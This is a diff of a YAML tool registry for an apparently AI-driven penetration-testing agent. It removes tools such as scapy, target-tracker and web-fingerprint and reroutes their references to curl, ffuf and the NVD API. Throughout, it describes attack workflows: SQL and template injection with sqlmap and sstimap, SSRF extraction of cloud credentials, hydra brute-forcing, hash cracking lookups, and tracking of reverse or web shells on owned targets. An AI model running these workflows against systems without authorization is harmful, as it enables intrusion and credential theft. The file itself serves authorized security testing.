       when: 'WARNING: -t ACTUALLY DESERIALIZES the generated payload locally to verify the gadget fires (i.e., literally calls
@@ -18286,295 +17508,6 @@ tools:
       purpose: Short-form help (same content as --help).
     - command: -version
       purpose: Print version (e.g., `dev` for the current Kali apt build) and exit.
-  scapy:
-    name: scapy
-    version: '2.5'
-    description: 'Packet crafting and low-level network testing via Scapy 2.5. 8 methods: udp_send (send/receive UDP packets),
-      udp_probe (UDP service discovery with protocol-specific probes), tcp_syn (SYN scan single port), icmp_ping (ICMP echo),
-      dns_query (DNS lookups with A/AAAA/MX/NS/TXT/SOA/ANY types), craft_packet (custom TCP/UDP/ICMP with hex payloads and
-      TCP flags), arp_scan (local network host discovery with MAC addresses), snmp_get (SNMP community string testing). Requires
-      NET_RAW and NET_ADMIN capabilities for raw socket access.'
-    image: ghcr.io/silicon-works/mcp-tools-scapy:latest
-    image_size_mb: 200
-    timeout_seconds: 300
-    capabilities:
-    - packet_crafting
-    - udp_testing
-    - protocol_manipulation
-    - raw_sockets
-    - arp_scanning
-    - dns_queries
-    - snmp_testing
-    routing:
-      use_for:
-      - send and receive UDP packets for protocol testing and service interaction
-      - probe UDP ports with service-specific payloads for service discovery
-      - craft custom TCP UDP or ICMP packets with specific flags and hex payloads
-      - ARP scan local network to discover hosts and MAC addresses
-      - DNS query with specific record types (A, MX, NS, TXT, SOA, ANY)
-      - test SNMP community strings against target devices
-      - protocol fuzzing with raw socket packet crafting
-      - single-port TCP SYN check when full nmap scan is overkill
-      never_use_for:
-      - HTTP requests (use curl)
-      - port scanning (use nmap)
-      triggers:
-      - UDP
-      - packet craft
-      - raw socket
-      - ARP scan
-      - SNMP
-      - DNS query
-      - protocol fuzz
-      - scapy
-      prefer_over:
-      - netcat for UDP
-    phases:
-    - reconnaissance
-    - enumeration
-    - exploitation
-    requirements:
-      network: true
-      privileged: true
-      privileged_reason: Requires raw sockets (NET_RAW, NET_ADMIN) for packet crafting and ARP operations
-      capabilities:
-      - NET_RAW
-      - NET_ADMIN
-    resources:
-      memory_mb: 256
-      cpu: 0.5
-    methods:
-      udp_send:
-        description: Send a UDP packet and receive response
-        when_to_use: For UDP protocol testing, service interaction, or custom payloads
-        params:
-          target:
-            type: string
-            required: true
-            description: Target IP address
-          port:
-            type: integer
-            required: true
-            description: Target UDP port
-          data:
-            type: string
-            required: true
-            description: Payload data (string or hex with 0x prefix)
-          sport:
-            type: integer
-            default: 0
-            description: Source port (0 = random)
-          timeout:
-            type: integer
-            default: 5
-            description: Response timeout in seconds
-        returns:
-          received:
-            type: boolean
-            description: Whether response was received
-          payload_hex:
-            type: string
-            description: Response payload as hex
-          payload_ascii:
-            type: string
-            description: Response payload as ASCII
-      udp_probe:
-        description: Probe UDP ports to discover services
-        when_to_use: For UDP service discovery when nmap UDP scan is insufficient
-        params:
-          target:
-            type: string
-            required: true
-            description: Target IP
-          ports:
-            type: string
-            required: true
-            description: Ports to probe (comma-separated or range)
-          probe_data:
-            type: string
-            default: ''
-            description: Custom probe data (empty for service-specific defaults)
-          timeout:
-            type: integer
-            default: 3
-            description: Timeout per probe
-        returns:
-          results:
-            type: array
-            description: Per-port probe results
-          open_ports:
-            type: array
-            description: Potentially open ports
-      tcp_syn:
-        description: Send TCP SYN packet for custom port probing
-        when_to_use: For stealthy single-port checks or custom TCP testing
-        params:
-          target:
-            type: string
-            required: true
-            description: Target IP
-          port:
-            type: integer
-            required: true
-            description: Target port
-          timeout:
-            type: integer
-            default: 3
-            description: Response timeout
-        returns:
-          state:
-            type: string
-            description: Port state (open, closed, filtered)
-          response:
-            type: object
-            description: Response packet summary
-      icmp_ping:
-        description: Send ICMP echo request
-        when_to_use: For host discovery when regular ping is blocked
-        params:
-          target:
-            type: string
-            required: true
-            description: Target IP
-          count:
-            type: integer
-            default: 1
-            description: Number of pings
-          timeout:
-            type: integer
-            default: 3
-            description: Response timeout
-        returns:
-          received:
-            type: integer
-            description: Number of responses
-          loss_percent:
-            type: number
-            description: Packet loss percentage
-      dns_query:
-        description: Send DNS query to a server
-        when_to_use: For DNS enumeration, zone transfer testing, or custom DNS queries
-        params:
-          server:
-            type: string
-            required: true
-            description: DNS server IP
-          domain:
-            type: string
-            required: true
-            description: Domain to query
-          query_type:
-            type: string
-            enum:
-            - A
-            - AAAA
-            - MX
-            - NS
-            - TXT
-            - SOA
-            - CNAME
-            - PTR
-            - ANY
-            default: A
-            description: DNS query type
-          timeout:
-            type: integer
-            default: 5
-            description: Response timeout
-        returns:
-          answers:
-            type: array
-            description: DNS answers
-          answer_count:
-            type: integer
-            description: Number of answers
-      craft_packet:
-        description: Craft and send a custom packet
-        when_to_use: For protocol testing, fuzzing, or when no specialized tool exists
-        params:
-          target:
-            type: string
-            required: true
-            description: Target IP
-          protocol:
-            type: string
-            enum:
-            - tcp
-            - udp
-            - icmp
-            required: true
-            description: Protocol layer
-          port:
-            type: integer
-            description: Destination port (for TCP/UDP)
-          flags:
-            type: string
-            default: S
-            description: TCP flags (S=SYN, A=ACK, F=FIN, R=RST, P=PSH, U=URG)
-          payload_hex:
-            type: string
-            description: Payload as hex string
-          payload_ascii:
-            type: string
-            description: Payload as ASCII string
-          timeout:
-            type: integer
-            default: 5
-            description: Response timeout
-        returns:
-          response:
-            type: object
-            description: Response packet summary
-      arp_scan:
-        description: Perform ARP scan on local network
-        when_to_use: For local network host discovery
-        params:
-          network:
-            type: string
-            required: true
-            description: Network range (e.g., 192.168.1.0/24)
-          timeout:
-            type: integer
-            default: 3
-            description: Response timeout
-        returns:
-          hosts:
-            type: array
-            description: Discovered hosts with IP and MAC
-          host_count:
-            type: integer
-            description: Number of hosts found
-      snmp_get:
-        description: Send SNMP GET request for community string testing
-        when_to_use: To test SNMP community strings
-        params:
-          target:
-            type: string
-            required: true
-            description: Target IP
-          community:
-            type: string
-            default: public
-            description: SNMP community string to test
-          oid:
-            type: string
-            default: 1.3.6.1.2.1.1.1.0
-            description: OID to query
-          port:
-            type: integer
-            default: 161
-            description: SNMP port
-          timeout:
-            type: integer
-            default: 5
-            description: Response timeout
-        returns:
-          valid_community:
-            type: boolean
-            description: Whether community string is valid
-          response:
-            type: string
-            description: SNMP response data
   searchsploit:
     name: searchsploit
     kind: cli
@@ -18619,9 +17552,10 @@ tools:
         use_instead: nuclei or nmap vuln scripts
         reason: searchsploit is offline DB lookup, NOT a vulnerability scanner — it does not probe targets
       - task: CVE detail / NVD metadata lookup
-        use_instead: cve-lookup
-        reason: searchsploit --cve returns ExploitDB matches for that CVE; cve-lookup queries NVD for full CVE description,
-          CVSS, CPE, references
+        use_instead: curl the public NVD API
+        reason: searchsploit --cve returns ExploitDB matches for that CVE; for full CVE description/CVSS/CPE/references curl
+          https://services.nvd.nist.gov/rest/json/cves/2.0?cveId=<CVE> (keyless; add EPSS api.first.org + CISA KEV JSON for
+          exploitability triage)
       - task: live online exploit search
         use_instead: WebFetch against https://www.exploit-db.com/search
         reason: searchsploit uses the LOCAL mirror; for the absolute-latest exploits run `searchsploit -u` first or query
@@ -18648,9 +17582,6 @@ tools:
       memory_mb: 256
       cpu: 0.5
     see_also:
-    - tool: cve-lookup
-      reason: After searchsploit --cve returns matching exploits, use cve-lookup to fetch the full NVD record (CVSS score,
-        CPE, affected versions, references) for the same CVE — the two tools are complementary.
     - tool: nmap
       reason: 'Standard workflow: nmap -sV -oX /session/output/scan.xml <target>, then `searchsploit --nmap /session/output/scan.xml
         -j` to find exploits matching the detected services. The nmap XML output is the canonical input for searchsploit''s
@@ -18716,9 +17647,9 @@ tools:
     - name: CVE lookup
       command: searchsploit --cve CVE-2021-44228 -j
       when: 'Look up exploits for a known CVE. Most precise search — `--cve` matches the CVE field directly rather than free-text.
-        Use this when you have a CVE from a vulnerability scan (nuclei, nessus, OpenVAS) or from cve-lookup. Results are typically
-        smaller and more relevant than free-text search. Example CVEs: CVE-2021-44228 (Log4Shell), CVE-2017-5638 (Struts2
-        RCE), CVE-2014-6271 (Shellshock), CVE-2017-0144 (EternalBlue).'
+        Use this when you have a CVE from a vulnerability scan (nuclei, nessus, OpenVAS). Results are typically smaller and
+        more relevant than free-text search. Example CVEs: CVE-2021-44228 (Log4Shell), CVE-2017-5638 (Struts2 RCE), CVE-2014-6271
+        (Shellshock), CVE-2017-0144 (EternalBlue).'
     - name: EDB-ID lookup (retrieve specific exploit metadata)
       command: searchsploit --id 50383 -j
       when: Fetch metadata for a specific exploit by its EDB-ID. Useful when you've seen an EDB-ID referenced elsewhere (write-up,
@@ -19720,9 +18651,9 @@ tools:
     - name: Walk installed software (HOST-RESOURCES-MIB hrSWInstalledTable)
       binary: snmpwalk
       command: -v 2c -c {community} -m HOST-RESOURCES-MIB {host} 1.3.6.1.2.1.25.6.3
-      when: List installed packages with versions. Drop the result into a CVE search (cve-lookup tool, or feed to nuclei).
-        For Windows targets this often includes service-pack-level detail. For Linux, mirrors `dpkg -l` / `rpm -qa`. The version
-        column is at .25.6.3.1.2.
+      when: List installed packages with versions. Drop the result into a CVE search (feed to nuclei, or curl the public NVD
+        API). For Windows targets this often includes service-pack-level detail. For Linux, mirrors `dpkg -l` / `rpm -qa`.
+        The version column is at .25.6.3.1.2.
     - name: Walk network interfaces (ifTable + ipAddrTable)
       binary: snmpwalk
       command: -v 2c -c {community} {host} 1.3.6.1.2.1.2.2.1
@@ -20199,9 +19130,10 @@ tools:
         stdlib for browser-specific binary password decoding like Firefox signons.sqlite NSS), drop into `exploit-runner`
         with a Write-staged Python script that uses sqlite3 + the relevant decryption library (e.g., pyasn1 for NSS, cryptography
         for Chrome v10/v11 key).
-    - tool: hash-lookup
-      reason: After find_credentials extracts password hashes (MD5 in WordPress phpass, bcrypt $2a$, $P$ phpass), feed to
-        `hash-lookup` to check public pre-cracked databases (hashes.com, NIST) before spending CPU on hashcat.
+    - tool: curl
+      reason: 'After find_credentials extracts password hashes, use curl to check public pre-cracked databases (nitrxgen/hashtoolkit)
+        before spending CPU on hashcat — see curl''s ''Online pre-cracked hash lookup'' usage_pattern. Only UNSALTED hashes
+        resolve this way: bcrypt $2a$ / $P$ phpass are salted and will NOT be in online DBs — send those straight to hashcat/john.'
     target_extraction: []
     reject_flags: []
     reject_flags_reason: sqlite3 takes a local DB path + SQL; there's no remote-target argument shape. The DB-path positional
@@ -20479,7 +19411,8 @@ tools:
       - MongoDB or other document-store enumeration — use mongodb tool
       - directory or parameter brute-forcing — use ffuf
       - automated CVE / vulnerability scanning — use nuclei
-      - stateful authenticated session flows beyond a single Cookie/auth-cred — use web-session
+      - stateful authenticated session flows beyond a single Cookie/auth-cred — drive the login with curl -c to capture a
+        cookie jar, then pass it via --cookie
       triggers:
       - sqlmap
       - sql injection
@@ -20508,8 +19441,9 @@ tools:
       reason: Crack the hash dumps that --passwords / dump_table extract
     - tool: hashcat
       reason: GPU cracker for the same hashes
-    - tool: web-session
-      reason: Use to obtain an authenticated cookie before passing --cookie to sqlmap
+    - tool: curl
+      reason: Drive a login with curl -c to capture a cookie jar (/session/cookies/x.txt), then pass that Cookie value via
+        --cookie to sqlmap for injection testing behind a login
     target_extraction:
     - rule: flag_value
       flag: -u
@@ -21707,9 +20641,6 @@ tools:
       reason: 'After SSRFmap''s `aws` module extracts IAM credentials (written to /opt/ssrfmap/<host>_<port>/iam-* files),
         feed to the `aws` tool (kind:cli vendor wrap of awslabs.aws-api-mcp-server) for full AWS enumeration: STS GetCallerIdentity,
         IAM list policies, S3 enum, EC2 enum, etc.'
-    - tool: hash-lookup
-      reason: After ssrfmap's `smbhash` (via responder) captures NTLMv2, before spending hashcat cycles, check public pre-cracked
-        databases via `hash-lookup` (hashes.com, NIST).
     target_extraction: []
     target_extraction_reason: 'SSRFmap takes a request file (-r REQFILE) where the target is encoded inside the raw HTTP request''s
       Host: header + URL. No top-level positional target arg suitable for extraction.'
@@ -21989,7 +20920,8 @@ tools:
       be marked by * in the URL or POST body, or auto-discovered across query/body/headers/cookies via -P. Some flags collide
       with sister tools (sqlmap uses -X for HTTP method; sstimap uses -m for method and -X for eval-code) — read this YAML
       carefully. Use for confirmed or suspected SSTI only — NOT for SQL injection (use sqlmap), NoSQL (use curl with operator-injection
-      payloads + nuclei NoSQL templates), file inclusion (use lfi-rfi), or directory enumeration (use ffuf).'
+      payloads + nuclei NoSQL templates), file inclusion (use ffuf with seclists LFI wordlists for traversal fuzzing + curl
+      for php://filter source read / RFI), or directory enumeration (use ffuf).'
     image: ghcr.io/silicon-works/mcp-tools-ssti:latest
     image_size_mb: 320
     idle_timeout_seconds: 300
@@ -22018,11 +20950,13 @@ tools:
       never_use_for:
       - SQL injection — use sqlmap
       - NoSQL injection — use curl with operator-injection payloads ($ne, $regex, $where) plus nuclei NoSQL templates
-      - Local/Remote File Inclusion — use lfi-rfi
+      - Local/Remote File Inclusion — use ffuf (LFI fuzzing w/ seclists LFI wordlists) + curl (php://filter source read, RFI
+        via callback listener)
       - XSS detection — use nuclei or zap
       - directory or parameter brute-forcing — use ffuf
       - automated CVE / vulnerability scanning — use nuclei
-      - stateful authenticated session flows beyond a single Cookie/header — use web-session
+      - stateful authenticated session flows beyond a single Cookie/header — drive the login with curl -c to capture a cookie
+        jar, then pass it via -C/--cookie
       triggers:
       - ssti
       - template injection
@@ -22054,19 +20988,15 @@ tools:
     see_also:
     - tool: sqlmap
       reason: Both test for injection but in different contexts — sqlmap covers SQL, ssti covers template-engine code execution.
-    - tool: lfi-rfi
-      reason: SSTI is template-engine code execution; LFI/RFI is file inclusion. Different vulnerability classes — agents
-        sometimes confuse them.
     - tool: nuclei
       reason: Nuclei has community templates that probe for SSTI on common endpoints (e.g., flask-jinja2, twig-debug); use
         nuclei first to find candidate URLs, then ssti for confirmation + exploitation.
     - tool: curl
       reason: Use curl to manually fire SSTI canaries ({{7*7}}, ${7*7}, <%= 7*7 %>) for fast triage; switch to ssti for the
-        full engine matrix + sandbox escape.
+        full engine matrix + sandbox escape. When the injection point is behind a login, drive the login with curl -c to capture
+        a cookie jar, then pass that Cookie value via -C/--cookie to sstimap.
     - tool: ffuf
       reason: Use ffuf to discover URL parameters first; feed them to ssti -u with the asterisk marker.
-    - tool: web-session
-      reason: Capture an authenticated cookie before passing -C/--cookie to sstimap when the injection point is behind a login.
     target_extraction:
     - rule: flag_value
       flag: -u
@@ -22192,7 +21122,7 @@ tools:
     - name: Probe behind an authenticated session (cookie)
       command: sstimap -u {url_with_asterisk} -C {cookie_string} --no-color
       when: 'Endpoint requires login — paste the Cookie header value via -C/--cookie (note: short flag is -C uppercase, NOT
-        -c which is --crawl). Pair with web-session for token capture.'
+        -c which is --crawl). Pair with a curl or playwright login for token capture.'
     - name: Probe through Burp / a proxy
       command: sstimap -u {url_with_asterisk} -p http://127.0.0.1:8080 --no-color
       when: 'Route every request through Burp/ZAP for live inspection. Note: sstimap''s proxy flag is -p (lowercase), NOT
@@ -22383,488 +21313,6 @@ tools:
       purpose: Same as -V
     - command: sstimap --module list
       purpose: List all available SSTImap payload modules (one per engine)
-  target-tracker:
-    name: target-tracker
-    version: '1.0'
-    description: 'Track target state throughout a penetration test engagement. 17 methods in 6 categories: targets (add_target,
-      get_target, list_targets), ports/services (add_port), credentials (add_credential, update_credential, get_credentials),
-      vulnerabilities (add_vulnerability, update_vulnerability), sessions (add_session, remove_session), loot (add_loot),
-      attacks (record_attack, get_attack_history), ownership (mark_owned), notes (add_note), reporting (get_summary, suggest_next_steps).
-      In-memory state persists across calls within a single container session. Does NOT require network — runs locally.'
-    image: ghcr.io/silicon-works/mcp-tools-target-tracker:latest
-    image_size_mb: 80
-    timeout_seconds: 60
-    capabilities:
-    - state_tracking
-    - credential_management
-    - vulnerability_tracking
-    - attack_history
-    - loot_tracking
-    - session_management
-    routing:
-      use_for:
-      - track discovered ports and services on target hosts during enumeration
-      - store and manage credentials found during penetration test (passwords, hashes, SSH keys)
-      - record discovered vulnerabilities with CVE and severity for reporting
-      - log attack attempts and results to avoid retesting and track progress
-      - register active shell and SSH sessions on exploited targets
-      - record retrieved loot (flags, config files, database dumps, SSH keys)
-      - mark target as owned at user or root level
-      - get engagement summary and suggested next steps based on current state
-      never_use_for:
-      - actual scanning or exploitation
-      - credential testing
-      triggers:
-      - track target
-      - store credential
-      - record vulnerability
-      - attack history
-      - next steps
-      - engagement summary
-      - mark owned
-      prefer_over: []
-    phases:
-    - reconnaissance
-    - enumeration
-    - exploitation
-    - post-exploitation
-    requirements:
-      network: false
-      privileged: false
-    resources:
-      memory_mb: 128
-      cpu: 0.25
-    methods:
-      add_target:
-        description: Add or update a target host
-        when_to_use: When you discover a new target IP or want to update target info
-        params:
-          ip:
-            type: string
-            required: true
-            description: Target IP address
-          hostname:
-            type: string
-            description: Target hostname
-          os:
-            type: string
-            description: Operating system
-          os_version:
-            type: string
-            description: OS version
-          tags:
-            type: array
-            description: Tags for categorization
-        returns:
-          ip:
-            type: string
-            description: Target IP
-      get_target:
-        description: Get complete state for a target
-        when_to_use: To review all known information about a target
-        params:
-          ip:
-            type: string
-            required: true
-            description: Target IP address
-        returns:
-          target:
-            type: object
-            description: Complete target state
-      list_targets:
-        description: List all tracked targets
-        when_to_use: To see all targets in the engagement
-        params:
-          filter_owned:
-            type: boolean
-            description: Only show owned targets
-          filter_tag:
-            type: string
-            description: Filter by tag
-        returns:
-          targets:
-            type: array
-            description: List of targets
-      add_port:
-        description: Add discovered port/service to target
-        when_to_use: After port scanning to record discovered services
-        params:
-          ip:
-            type: string
-            required: true
-            description: Target IP
-          port:
-            type: integer
-            required: true
-            description: Port number
-          protocol:
-            type: string
-            default: tcp
-            description: Protocol (tcp/udp)
-          service:
-            type: string
-            description: Service name
-          version:
-            type: string
-            description: Service version
-          banner:
-            type: string
-            description: Service banner
-        returns:
-          success:
-            type: boolean
-            description: Whether port was added
-      add_credential:
-        description: Add discovered credential
-        when_to_use: When you find a username, password, or hash
-        params:
-          ip:
-            type: string
-            required: true
-            description: Target IP
-          username:
-            type: string
-            required: true
-            description: Username
-          password:
-            type: string
-            description: Password
-          hash:
-            type: string
-            description: Password hash
-          private_key:
-            type: string
-            description: SSH private key
-          service:
-            type: string
-            description: Service (ssh, smb, web)
-          source:
-            type: string
-            description: Where credential was found
-          status:
-            type: string
-            enum:
-            - discovered
-            - testing
-            - valid
-            - invalid
-            default: discovered
-            description: Credential status
-        returns:
-          credential_id:
-            type: string
-            description: ID of added credential
-      update_credential:
-        description: Update credential status after testing
-        when_to_use: After testing a credential to mark it valid or invalid
-        params:
-          ip:
-            type: string
-            required: true
-            description: Target IP
-          credential_id:
-            type: string
-            required: true
-            description: Credential ID
-          status:
-            type: string
-            required: true
-            enum:
-            - discovered
-            - testing
-            - valid
-            - invalid
-            - expired
-            description: New status
-          notes:
-            type: string
-            description: Additional notes
-        returns:
-          success:
-            type: boolean
-            description: Whether update succeeded
-      get_credentials:
-        description: Get credentials for a target
-        when_to_use: To retrieve stored credentials for a target
-        params:
-          ip:
-            type: string
-            required: true
-            description: Target IP
-          status:
-            type: string
-            enum:
-            - discovered
-            - testing
-            - valid
-            - invalid
-            - expired
-            description: Filter by status
-          service:
-            type: string
-            description: Filter by service
-        returns:
-          credentials:
-            type: array
-            description: List of credentials
-      add_vulnerability:
-        description: Add discovered vulnerability
-        when_to_use: When you identify a potential vulnerability
-        params:
-          ip:
-            type: string
-            required: true
-            description: Target IP
-          name:
-            type: string
-            required: true
-            description: Vulnerability name
-          cve:
-            type: string
-            description: CVE identifier
-          severity:
-            type: string
-            enum:
-            - critical
-            - high
-            - medium
-            - low
-            description: Severity level
-          affected_component:
-            type: string
-            description: Affected service/component
-          description:
-            type: string
-            description: Vulnerability description
-          exploit_available:
-            type: boolean
-            default: false
-            description: Is exploit available
-        returns:
-          vuln_id:
-            type: string
-            description: ID of added vulnerability
-      update_vulnerability:
-        description: Update vulnerability status
-        when_to_use: After confirming or exploiting a vulnerability
-        params:
-          ip:
-            type: string
-            required: true
-            description: Target IP
-          vuln_id:
-            type: string
-            required: true
-            description: Vulnerability ID
-          status:
-            type: string
-            required: true
-            enum:
-            - potential
-            - confirmed
-            - exploited
-            - patched
-            description: New status
-          exploit_used:
-            type: string
-            description: Exploit that was used
-          notes:
-            type: string
-            description: Additional notes
-        returns:
-          success:
-            type: boolean
-            description: Whether update succeeded
-      add_session:
-        description: Register an active session on target
-        when_to_use: When you establish a shell or SSH session
-        params:
-          ip:
-            type: string
-            required: true
-            description: Target IP
-          session_id:
-            type: string
-            required: true
-            description: Session ID (from shell-session)
-          session_type:
-            type: string
-            required: true
-            enum:
-            - ssh
-            - reverse_shell
-            - web_shell
-            description: Session type
-          user:
-            type: string
-            description: User context
-          privilege_level:
-            type: string
-            enum:
-            - user
-            - root
-            - system
-            description: Privilege level
-        returns:
-          success:
-            type: boolean
-            description: Whether session was registered
-      remove_session:
-        description: Remove closed session
-        when_to_use: When a session is closed or dies
-        params:
-          ip:
-            type: string
-            required: true
-            description: Target IP
-          session_id:
-            type: string
-            required: true
-            description: Session ID
-        returns:
-          success:
-            type: boolean
-            description: Whether session was removed
-      add_loot:
-        description: Record retrieved file or data
-        when_to_use: When you retrieve a flag, config file, or sensitive data
-        params:
-          ip:
-            type: string
-            required: true
-            description: Target IP
-          name:
-            type: string
-            required: true
-            description: Loot name/filename
-          loot_type:
-            type: string
-            default: file
-            enum:
-            - file
-            - hash
-            - key
-            - config
-            - database
-            - flag
-            description: Type of loot
-          path:
-            type: string
-            description: Original path on target
-          content_preview:
-            type: string
-            description: Preview of content
-          notes:
-            type: string
-            description: Additional notes
-        returns:
-          loot_id:
-            type: string
-            description: ID of added loot
-      record_attack:
-        description: Record an attack attempt
-        when_to_use: To log what attacks have been tried and their results
-        params:
-          ip:
-            type: string
-            required: true
-            description: Target IP
-          attack_type:
-            type: string
-            required: true
-            description: Type of attack
-          target_service:
-            type: string
-            description: Target service/port
-          tool_used:
-            type: string
-            description: Tool used
-          payload:
-            type: string
-            description: Payload used
-          success:
-            type: boolean
-            required: true
-            description: Was attack successful
-          result:
-            type: string
-            description: Result description
-        returns:
-          attack_id:
-            type: string
-            description: ID of recorded attack
-      get_attack_history:
-        description: Get attack history for target
-        when_to_use: To see what has already been tried
-        params:
-          ip:
-            type: string
-            required: true
-            description: Target IP
-          attack_type:
-            type: string
-            description: Filter by attack type
-          success_only:
-            type: boolean
-            description: Only show successful attacks
-        returns:
-          attacks:
-            type: array
-            description: List of attack attempts
-      mark_owned:
-        description: Mark target as owned
-        when_to_use: When you achieve user or root access
-        params:
-          ip:
-            type: string
-            required: true
-            description: Target IP
-          level:
-            type: string
-            required: true
-            enum:
-            - user
-            - root
-            description: Ownership level
-        returns:
-          success:
-            type: boolean
-            description: Whether target was marked
-      add_note:
-        description: Add a note to target
-        when_to_use: To record observations or important findings
-        params:
-          ip:
-            type: string
-            required: true
-            description: Target IP
-          note:
-            type: string
-            required: true
-            description: Note content
-        returns:
-          success:
-            type: boolean
-            description: Whether note was added
-      get_summary:
-        description: Get engagement summary
-        when_to_use: To get an overview of the entire engagement
-        params: {}
-        returns:
-          summary:
-            type: object
-            description: Engagement statistics
-      suggest_next_steps:
-        description: Get suggested next steps based on current state
-        when_to_use: When unsure what to do next
-        params:
-          ip:
-            type: string
-            description: Target IP (optional, for specific target)
-        returns:
-          suggestions:
-            type: array
-            description: List of suggested actions
   theharvester:
     name: theharvester
     kind: cli
@@ -22951,9 +21399,6 @@ tools:
       reason: After discovering hosts with theHarvester, use nmap to port-scan the resolved IPs.
     - tool: nuclei
       reason: After discovering subdomains, use nuclei to scan for known CVEs and misconfigurations.
-    - tool: web-fingerprint
-      reason: After discovering hosts and subdomains, use web-fingerprint to identify the technology stack (CMS, frameworks,
-        servers) running on each.
     - tool: hydra
       reason: After harvesting email addresses, use hydra for credential brute-forcing against web logins, OWA, or SSH using
         discovered email addresses as usernames.
@@ -23240,7 +21685,7 @@ tools:
       never_use_for:
       - web application vulnerability scanning (use nuclei or nikto)
       - network port / service vulnerability scanning (use nmap with scripts)
-      - single-CVE research and CVSS lookup (use cve-lookup for NVD details)
+      - 'single-CVE research and CVSS lookup (curl the public NVD API: services.nvd.nist.gov/rest/json/cves/2.0?cveId=<CVE>)'
       - AWS read-only compliance auditing (use prowler — broader checks)
       - AWS attack-path analysis (use cloudfox — cross-service correlation)
       - deep secret pattern scanning across git history (use trufflehog)
@@ -23288,9 +21733,6 @@ tools:
         description: AWS STS session token (for assume-role / temporary credentials).
         required: false
     see_also:
-    - tool: cve-lookup
-      reason: Use cve-lookup to research specific CVEs found by trivy — get CVSS scores, descriptions, and references from
-        NVD. trivy reports CVE IDs but not full advisory detail.
     - tool: nuclei
       reason: nuclei scans RUNNING web services for vulnerabilities; trivy scans IMAGES / CODE / CONFIGS at rest. Pair them
         when targeting a containerized app — trivy on the image, nuclei against the running endpoint.
@@ -24656,448 +23098,6 @@ tools:
     - command: vol --info
       purpose: Boolean flag — print framework info including all plugin descriptions and exit. Equivalent to `frameworkinfo.FrameworkInfo`
         without needing -f.
-  web-fingerprint:
-    name: web-fingerprint
-    version: '1.0'
-    description: Web technology fingerprinting tool that identifies CMS platforms (WordPress, Joomla, Drupal, XWiki), server-side
-      frameworks (Laravel, Django, Rails, ASP.NET, Spring, Express), web servers (Apache, nginx, IIS, Tomcat, Jetty), JavaScript
-      frameworks (React, Vue.js, Angular, jQuery), database management UIs (phpMyAdmin, Adminer), DevOps tools (GitLab, Jenkins,
-      Grafana, Kibana), and CDN/infrastructure (CloudFlare, AWS ELB, Varnish) using signature-based matching against HTTP
-      headers, response body patterns, meta tags, and cookies. Also checks security headers and calculates favicon hashes.
-    image: ghcr.io/silicon-works/mcp-tools-web-fingerprint:latest
-    image_size_mb: 100
-    timeout_seconds: 120
-    capabilities:
-    - technology_detection
-    - cms_identification
-    - framework_detection
-    - server_fingerprinting
-    - security_header_analysis
-    phases:
-    - reconnaissance
-    - enumeration
-    requirements:
-      network: true
-      privileged: false
-    resources:
-      memory_mb: 128
-      cpu: 0.25
-    routing:
-      use_for:
-      - technology detection and web stack identification
-      - CMS identification WordPress Joomla Drupal
-      - framework detection Laravel Django Rails ASP.NET Spring Express
-      - web server fingerprinting Apache nginx IIS Tomcat
-      - security header analysis and misconfiguration check
-      - identify technology stack behind a web application
-      - JavaScript framework detection React Vue Angular
-      - favicon hash calculation for Shodan lookup
-      - HTTP header analysis and information disclosure detection
-      - DevOps tool detection GitLab Jenkins Grafana Kibana
-      never_use_for:
-      - vulnerability scanning
-      - port scanning
-      - exploitation
-      triggers:
-      - fingerprint
-      - technology stack
-      - what technology
-      - CMS
-      - identify framework
-      - security headers
-      - favicon hash
-      prefer_over:
-      - nuclei
-    methods:
-      fingerprint:
-        description: 'Fingerprint web technologies on a target URL using signature-based matching against HTTP headers, HTML
-          body patterns, meta generator tags, and cookies. Detects 25 technologies across 7 categories: CMS (WordPress, Joomla,
-          Drupal, XWiki), frameworks (Laravel, Django, Rails, ASP.NET, Spring, Express), web servers (Apache, nginx, IIS,
-          Tomcat, Jetty), JS frameworks (React, Vue.js, Angular, jQuery), database UIs (phpMyAdmin, Adminer), CDN/infrastructure
-          (CloudFlare, AWS ELB, Varnish), and DevOps tools (GitLab, Jenkins, Grafana, Kibana). Each detection includes a confidence
-          score (0-100) based on how many signature types matched (header=30, body=20, meta=40, cookie=25). Also extracts
-          page title, server header, cookie names, and internal paths from href/src/action attributes.'
-        when_to_use: 'As the first step after discovering an HTTP/HTTPS service to identify the technology stack before choosing
-          specific scanning tools. Results guide next steps: WordPress detected → use wpscan, Laravel/Django detected → test
-          framework-specific vulnerabilities, phpMyAdmin/Adminer detected → try default credentials, Jenkins/GitLab detected
-          → check for unauthenticated access. Run this before nikto/nuclei/zap to understand what you''re dealing with. Lighter
-          and faster than nuclei''s tech_detect method.'
-        params:
-          url:
-            type: string
-            required: true
-            description: Target URL to fingerprint (e.g., 'http://10.10.10.1', 'https://target.htb:8443'). Scheme is auto-added
-              as http:// if omitted.
-          follow_redirects:
-            type: boolean
-            default: true
-            description: Follow HTTP 3xx redirects to final destination. Set to false to analyze redirect behavior itself
-              (e.g., detecting redirect-based authentication).
-          timeout:
-            type: integer
-            default: 30
-            description: HTTP request timeout in seconds
-          user_agent:
-            type: string
-            description: 'Custom User-Agent header. Default: Chrome-like UA string. Change if target blocks automated scanners
-              or serves different content based on UA.'
-        returns:
-          technologies:
-            type: array
-            description: 'Detected technologies, each with ''technology'' name, ''confidence'' score (0-100), and ''matches''
-              array showing what matched (e.g., ''Header: X-Powered-By'', ''Body: /wp-content/'', ''Meta: generator=WordPress
-              6.1'', ''Cookie: laravel_session'')'
-          server:
-            type: string
-            description: Server header value (e.g., 'Apache/2.4.41', 'nginx/1.18.0', 'Microsoft-IIS/10.0')
-          title:
-            type: string
-            description: HTML page title extracted from <title> tag
-          interesting_paths:
-            type: array
-            description: Internal paths extracted from href, src, and action attributes in HTML (up to 50, relative paths
-              starting with /)
-          status_code:
-            type: integer
-            description: HTTP response status code
-          cookies:
-            type: array
-            description: Cookie names set by the server (e.g., ['PHPSESSID', 'laravel_session', 'csrftoken'])
-      headers:
-        description: 'Fetch and categorize all HTTP response headers into 4 groups: security headers (Content-Security-Policy,
-          Strict-Transport-Security, X-Frame-Options, X-Content-Type-Options, X-XSS-Protection, Referrer-Policy, Permissions-Policy,
-          Cross-Origin-Opener-Policy, Cross-Origin-Embedder-Policy), server info headers (Server, X-Powered-By, X-AspNet-Version,
-          X-Generator), cache headers (Cache-Control, Expires, Pragma, ETag, Last-Modified), and other headers.'
-        when_to_use: To get a full categorized view of all HTTP headers returned by the target. Use this for initial reconnaissance
-          to understand server configuration, identify technology versions from Server/X-Powered-By headers, check caching
